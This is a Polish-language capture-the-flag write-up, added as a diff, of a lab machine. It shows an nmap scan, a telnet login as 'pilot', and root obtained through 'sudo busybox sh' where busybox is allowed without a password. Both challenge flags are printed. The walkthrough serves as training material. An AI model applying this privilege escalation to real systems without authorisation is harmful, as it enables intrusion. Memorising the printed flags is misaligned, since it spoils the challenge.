@@ -1,0 +1,88 @@
+Project 17 - Wykorzystanie BusyBox
+
+
+*Rekonesans*
+*SKanowanie za pomocą Nmap*
+```
+nmap -A -v 10.10.201.245
+```
+```
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 05:00 EDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 05:00
+Completed NSE at 05:00, 0.00s elapsed
+Initiating NSE at 05:00
+Completed NSE at 05:00, 0.00s elapsed
+Initiating NSE at 05:00
+Completed NSE at 05:00, 0.00s elapsed
+Initiating Ping Scan at 05:00
+Scanning 10.10.17.195 [2 ports]
+Completed Ping Scan at 05:00, 0.06s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 05:00
+Completed Parallel DNS resolution of 1 host. at 05:00, 0.01s elapsed
+Initiating Connect Scan at 05:00
+Scanning 10.10.17.195 [1000 ports]
+Discovered open port 23/tcp on 10.10.201.245
+Discovered open port 22/tcp on 10.10.201.245
+Completed Connect Scan at 05:00, 6.39s elapsed (1000 total ports)
+Initiating Service scan at 05:00
+Scanning 2 services on 10.10.201.245
+Completed Service scan at 05:00, 0.11s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.201.245.
+Initiating NSE at 05:00
+Completed NSE at 05:00, 7.17s elapsed
+Initiating NSE at 05:00
+Completed NSE at 05:00, 0.00s elapsed
+Initiating NSE at 05:00
+Completed NSE at 05:00, 0.00s elapsed
+Nmap scan report for 10.10.201.245
+Host is up (0.053s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
+| ssh-hostkey: 
+|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
+|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
+|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
+23/tcp open  telnet  BSD-derived telnetd
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+```
+
+*Otwarte porty*
+```
+22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
+23/tcp open  telnet  BSD-derived telnetd
+```
+
+*Logowanie do Telnet*
+```
+telnet 10.10.201.245 23
+login: pilot
+
+cat user.txt
+THM{r3m0v3_b3f0r3_fl16h7}
+```
+
+sudo -l
+```
+User pilot may run the following commands on freebsd:
+    (root) NOPASSWD: /usr/local/bin/busybox
+```
+
+Można uruchomić BusyBox jako root.
+BusyBox zasadniczo łączy wiele różnych funkcji w jeden plik wykonywalny. Jest często używany w systemach wbudowanych w celu zmniejszenia wymaganej przestrzeni dyskowej i pamięci.
+
+*Target*
+```
+busybox
+warto zwrócić uwage na sh, które jest na liście zdefiniowanych funkcji.
+
+sudo /usr/local/bin/busybox sh
+```
+
+**Mam roota!!!**
+```
+cat /root/root.txt
+THM{h16hw4y_70_7h3_d4n63r_z0n3}
+```
